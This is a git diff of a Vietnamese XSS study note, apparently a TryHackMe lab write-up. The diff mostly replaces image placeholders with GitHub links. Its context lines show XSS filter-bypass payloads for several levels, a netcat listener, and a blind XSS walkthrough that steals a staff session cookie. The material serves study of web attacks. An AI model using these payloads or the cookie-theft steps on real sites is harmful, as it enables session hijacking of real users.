@@ -46,13 +46,13 @@ Ví dụ kịch bản như sau:
 
 1 website mà khi nhập thông tin sai, 1 error message sẽ được hiển thị. Nội dung của error message được lấy từ tham số ***error*** trong Query String và được tích hợp trực tiếp vào Page Source:
 
-![img](104)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image104.png?raw=true)
 
 Web Application không check nội dung của tham số ***error***, điều này cho phép attacker chèn mã độc vào:
 
-![img](105)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image105.png?raw=true)
 
-![img](106)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image106.png?raw=true)
 
 Cách kiểm tra ***Reflected XSS***:
 
@@ -72,7 +72,7 @@ Ví dụ kịch bản:
 
 1 Blog website cho phép User gửi bình luận. Không may, những bình luận này không được kiểm tra xem có chứa mã JavaScript hay lọc ra bất kỳ mã độc nào không. Nếu gửi 1 bình luận có chứa mã JavaScript, nó sẽ được lưu trong DB và User khác hiện đang truy cập bài viết chứa bình luận này sẽ chạy mã JavaScript trên Browser của họ.
 
-![img](107)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image107.png?raw=true)
 
 Cách kiểm tra ***Stored XSS***: 
 
@@ -94,7 +94,7 @@ Cách kiểm tra ***Stored XSS***:
 
 - ***Ví dụ***: Một trang web là một tài liệu HTML, và DOM giúp trình duyệt hiểu và hiển thị tài liệu đó. Có thể xem DOM như ***một bản đồ*** của trang web, giúp JavaScript "điều khiển" trang web dễ dàng hơn.
 
-![img](108)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image108.png?raw=true)
 
 ***Khai thác DOM (DOM-Based XSS)***
 
@@ -166,7 +166,7 @@ Blind XSS là một loại tấn công XSS không thể thấy kết quả ngay 
 
 => Form nhập tên: 
 
-![imt](109)
+![imt](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image109.png?raw=true)
 
 => Chèn payload: 
 
@@ -174,31 +174,31 @@ Blind XSS là một loại tấn công XSS không thể thấy kết quả ngay 
 
 vào ô nhập tên để sang Level2:
 
-![img](110)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image110.png?raw=true)
 
 ***Level2***:
 
-![img](111)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image111.png?raw=true)
 
 => Tên được hiển thị ở 1 ***< input>*** khác:
 
-![img](112)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image112.png?raw=true)
 
 => Để chèn mã vào ô nhập tên, cần thêm ***“>*** để nối tiếp. Nếu chỉ dùng payload:
 
     <script>alert(‘THM’);</script>
 
-![img](113)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image113.png?raw=true)
 
 Thay vào đó, chèn payload:
 
     “><script>alert(‘THM’);</script>
 
-![img](114)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image114.png?raw=true)
 
 ***Level3***:
 
-![img](115)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image115.png?raw=true)
 
 => Lần này tên được hiển thị trong thẻ ***< textarea>***
 
@@ -206,65 +206,65 @@ Thay vào đó, chèn payload:
 
     <script>alert(‘THM’);</script>
 
-![img](116)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image116.png?raw=true)
 
 Chèn payload sau để bypass ***< textarre>***: 
 
     </textarea><script>alert('THM');</script>
 
-![img](117)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image117.png?raw=true)
 
 ***Level4***
 
 Lần này sau khi nhập tên vào field, sẽ được hiển thị như sau: 
 
-![img](118)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image118.png?raw=true)
 
-![img](119)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image119.png?raw=true)
 
 => Chèn payload : ***';alert('THM');//***:
 
-![img](120)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image120.png?raw=true)
 
-![img](121)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image121.png?raw=true)
 
 Dấu ***‘*** sẽ đóng field xác định tên, sau đó dấu ***;*** thông báo kết thúc câu lệnh hiện tại và dấu ***//*** khiến những thứ đằng sau trở thành comment.
 
 ***Level5***:
 
-![img](122)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image122.png?raw=true)
 
-![img](123)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image123.png?raw=true)
 
 => Thử chèn payload vào ô nhập tên: 
     
     <script>alert(‘THM’);</script>
 
-![img](124)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image124.png?raw=true)
 
-![img](125)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image125.png?raw=true)
 
-=> Server có filter loại bỏ mọi từ có khả năng nguy hiểm!.
+=> Server có filter loại bỏ mọi từ có khả năng nguy hiểm, ở đây là ***script***.
 
 Để bypass, có thể thử cách sau: 
 
-![img](126)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image126.png?raw=true)
 
 => Chèn payload: 
 
     <sscriptcript>alert('THM');</sscriptcript>
 
-![img](127)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image127.png?raw=true)
 
 ***Level6***:
 
-![img](128)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image128.png?raw=true)
 
 => Thử chèn payload: 
 
     “><script>alert(‘THM’);</script>
 
-![img](129)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image129.png?raw=true)
 
 => Dấu ***<*** và ***>*** bị lọc khỏi payload, ngăn việc thoát khỏi thẻ ***< img>***.
 
@@ -272,21 +272,21 @@ Dấu ***‘*** sẽ đóng field xác định tên, sau đó dấu ***;*** thô
 
 => Thử chèn payload: ***/images/cat.jpg" onload="alert('THM');***: 
 
-![img](130)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image130.png?raw=true)
 
 ***Practical Example (Blind XSS)***
 
-![img](131)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image131.png?raw=true)
 
 => Xem source page và thấy phần Ticket Contents sử dụng thẻ ***< textarea>***:
 
-![img](132)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image132.png?raw=true)
 
 => Thử tạo vé mới với Ticket Contents như sau: 
 
-![img](133)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image133.png?raw=true)
 
-![img](134)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image134.png?raw=true)
 
 => Thoát được ra khỏi thẻ ***< textarea>***.
 
@@ -294,11 +294,11 @@ Dấu ***‘*** sẽ đóng field xác định tên, sau đó dấu ***;*** thô
 
     </textarea><script>alert('THM');</script>
 
-![img](135)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image135.png?raw=true)
 
 => Thành công, khi click vào xem vé sẽ có thông báo ***alert()***: 
 
-![img](136)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image136.png?raw=true)
 
 Một số thông tin hữu ích từ User là ***Cookie*** của họ, có thể dùng Cookie này để leo thang đặc quyền, bằng cách chiếm quyền điều khiển đăng nhập của họ. Để thực hiện, Payload cần phải trích xuất được Cookie của User, chuyển nó sang Web Server khác.
 
@@ -318,7 +318,7 @@ Có thể viết là
 	
     nc -nlvp 9001
 
-![img](137)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image137.png?raw=true)
 
 => Tạo vé mới với nội dung: 
 
@@ -336,15 +336,15 @@ Có thể viết là
 
 - ***document.cookie***: truy cập Cookie của nạn nhân
 
-![img](138)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image138.png?raw=true)
 
 => Sau khi chờ đợi đây là những gì thu được từ NetCat: 
 
-![img](139)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image139.png?raw=true)
 
 => Giải mã cookie: 
 
-![img](140)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image140.png?raw=true)
 
 => Tìm được staff-session!
 
